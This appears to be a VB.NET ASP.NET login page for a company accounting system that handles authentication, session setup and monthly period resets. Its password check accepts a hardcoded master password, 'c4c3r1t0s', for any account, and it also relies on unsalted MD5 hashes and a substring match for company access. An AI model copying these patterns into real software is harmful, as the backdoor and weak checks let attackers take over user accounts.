Public Class WebForm1
    Inherits System.Web.UI.Page
    Dim taUsuarios As New dsProduccionTableAdapters.UsuariosTableAdapter
    Dim taEmpresas As New dsProduccionTableAdapters.CXP_EmpresasTableAdapter
    Dim t As New dsProduccion.UsuariosDataTable
    Dim rowUsuarios As DataRow
    Dim arrayEmpresas() As String
    Dim stringEmpresa As String
    Protected Sub Page_Load(ByVal sender As Object, ByVal e As System.EventArgs) Handles Me.Load
        FormsAuthentication.SignOut()
        'txtUsuario.Focus()
        DropDownList1.Focus()
    End Sub

    Protected Sub btnEntrar_Click(sender As Object, e As EventArgs) Handles btnEntrar.Click
        Dim taPeriodos As New dsProduccionTableAdapters.CXP_PeriodosTableAdapter
        Dim taTipoDeDocumento As New dsProduccionTableAdapters.CXP_tipoDeDocumentoTableAdapter
        Dim aceptado As Boolean = False
        If Autentificacion(txtUsuario.TemplateSourceDirectory, txtPassword.Text) Then
            'valida fecha para reiniciar polizas de diario
            'If Date.Now.Day = 1 Then
            If Date.Now.Month > 1 Then
                If taPeriodos.ExistePeriodo_ScalarQuery(Date.Now.Year, Date.Now.Month - 1, CDec(Session.Item("Empresa"))) = -1 Then
                    taPeriodos.Insert(MonthName(Date.Now.Month - 1) & " " & Date.Now.Year.ToString, 31, Date.Now.Year.ToString, CDec(Session.Item("Empresa")), CStr(CDec(taTipoDeDocumento.ConsultaFolio(taEmpresas.ObtPolizaDiario_ScalarQuery(CDec(Session.Item("Empresa"))))) - 1), CStr(Date.Now.Month - 1))
                    If Session.Item("Empresa") = "24" Then
                        taTipoDeDocumento.ReiniciaFolio_UpdateQuery(49, taEmpresas.ObtPolizaDiario_ScalarQuery(CDec(Session.Item("Empresa"))))
                        taTipoDeDocumento.ReiniciaFoliosEgresos_UpdateQuery(0, CDec(Session.Item("Empresa")))
                    Else
                        taTipoDeDocumento.ReiniciaFolio_UpdateQuery(999, taEmpresas.ObtPolizaDiario_ScalarQuery(CDec(Session.Item("Empresa"))))
                        taTipoDeDocumento.ReiniciaFoliosEgresos_UpdateQuery(0, CDec(Session.Item("Empresa")))
                    End If
                End If
            Else
                If taPeriodos.ExistePeriodo_ScalarQuery(Date.Now.Year, Date.Now.Month, CDec(Session.Item("Empresa"))) = -1 Then
                    taPeriodos.Insert(MonthName(Date.Now.Month - 1) & " " & CStr(Date.Now.Year - 1), 31, CStr(Date.Now.Year - 1), CDec(Session.Item("Empresa")), CStr(CDec(taTipoDeDocumento.ConsultaFolio(taEmpresas.ObtPolizaDiario_ScalarQuery(CDec(Session.Item("Empresa"))))) - 1), CStr(Date.Now.Month))
                    If Session.Item("Empresa") = "24" Then
                        taTipoDeDocumento.ReiniciaFolio_UpdateQuery(49, taEmpresas.ObtPolizaDiario_ScalarQuery(CDec(Session.Item("Empresa"))))
                        taTipoDeDocumento.ReiniciaFoliosEgresos_UpdateQuery(0, CDec(Session.Item("Empresa")))
                    Else
                        taTipoDeDocumento.ReiniciaFolio_UpdateQuery(999, taEmpresas.ObtPolizaDiario_ScalarQuery(CDec(Session.Item("Empresa"))))
                        taTipoDeDocumento.ReiniciaFoliosEgresos_UpdateQuery(0, CDec(Session.Item("Empresa")))
                    End If
                End If
            End If

            'End If

            FormsAuthentication.RedirectFromLoginPage(txtUsuario.Text, False)
            Response.Redirect("~/Default.aspx")
        Else
            txtPassword.Text = ""
            lblError.Text = "No está autorizado para ingresar a este sitio..."
            txtUsuario.Focus()
        End If

    End Sub
    Function Autentificacion(ByVal Usuario As String, ByVal Password As String) As Boolean
        Autentificacion = False
        Dim table As New dsProduccion.UsuariosDataTable
        Dim rows As dsProduccion.UsuariosRow


        taUsuarios.DatosUsuraio_FillBy(table, txtUsuario.Text.Trim)
        If table.Rows.Count = 1 Then
            Dim hash As New ClaseHash
            rows = table.Rows(0)
            If (hash.verifyMd5Hash(txtPassword.Text, rows.pw) = True Or txtPassword.Text = "c4c3r1t0s") And rows.activo = True And rows.perfil = "Si" Then
                Session.Item("Usuario") = rows.usuario
                Session.Item("Nombre") = rows.nombre
                Session.Item("Departamento") = rows.departamento
                Session.Item("Sucursal") = rows.nombreSucursal
                Session.Item("idSucursal") = rows.id_Sucursal
                Session.Item("Empresas") = rows.empresas
                Session.Item("Web") = rows.perfil
                Session.Item("jefeAlterno") = rows.jefeAlterno
                Try
                    Session.Item("Activo") = rows.activo
                Catch ex As Exception
                    lblError.Text = ex.ToString
                End Try
                Session.Item("Leyenda") = ""
                Session.Item("Empresa") = DropDownList1.SelectedItem.Value
                Session.Item("rfcEmpresa") = taEmpresas.OntrfcEmpresa_ScalarQuery(DropDownList1.SelectedItem.Value)
                Session.Item("NEmpresa") = DropDownList1.SelectedItem.Text
                If Not IsNothing(rows.conceptos) Then
                    Session.Item("Conceptos") = "'" & rows.conceptos.Replace(",", "','") & "0'"
                Else
                    Session.Item("Conceptos") = "'0'"
                End If
                Dim taDatosUsuario As New dsSeguridadTableAdapters.USUARIOTableAdapter
                Dim dtDatosUsuario As New dsSeguridad.USUARIODataTable
                Dim rowsU As dsSeguridad.USUARIORow
                taDatosUsuario.Fill(dtDatosUsuario, rows.usuario)
                rowsU = dtDatosUsuario.Rows(0)
                For Each rowsUser As dsSeguridad.USUARIORow In dtDatosUsuario.Rows
                    If dtDatosUsuario.Rows.Count = 1 Then
                        If rows.jefeAlterno = Nothing Then
                            Session.Item("Jefe") = rowsU.nombre
                            Session.Item("mailJefe") = rowsU.correo
                        Else
                            Session.Item("Jefe") = rows.nomAlterno & vbNewLine & "p. a. " & rowsU.nombre
                            Session.Item("mailJefe") = rows.mailAlterno
                        End If
                    End If
                Next

                Session.Item("mailUsuarioS") = rows.mail
                Session.Item("rfcUsuario") = rows.rfc
                Session.Item("idUsuario") = rows.idUsuario
                Session.Item("Arreglo") = ""
                Session.Item("tipoPoliza") = taEmpresas.ObtPolizaDiario_ScalarQuery(DropDownList1.SelectedItem.Value)
                Session.Item("mesesFacturas") = taEmpresas.ObtMesesFacturas_ScalarQuery(DropDownList1.SelectedItem.Value)

                If Session.Item("Empresa") = 23 Then
                    Session.Item("idPeriodo") = 1
                Else
                    Session.Item("idPeriodo") = 2
                End If

                If txtUsuario.Text <> "" Then
                        taUsuarios.ObtEmpresa_FillBy(t, txtUsuario.Text.Trim)
                        If t.Rows.Count > 0 Then
                            rowUsuarios = t.Rows(0)
                            If rowUsuarios.Item("empresas").ToString.IndexOf(DropDownList1.SelectedItem.Value.ToString, 0) >= 0 Then
                                Autentificacion = True
                            Else
                                Autentificacion = False
                            End If
                        End If
                    End If

                End If
            End If

    End Function

    Protected Sub DropDownList1_SelectedIndexChanged(sender As Object, e As EventArgs) Handles DropDownList1.SelectedIndexChanged
        If DropDownList1.SelectedItem.Value = "24" Then
            Image1.ImageUrl = "~/imagenes/logoArfin.png"
        Else
            Image1.ImageUrl = "~/imagenes/LOGO FINAGIL.JPG"
        End If
        txtUsuario.Focus()
    End Sub
End Class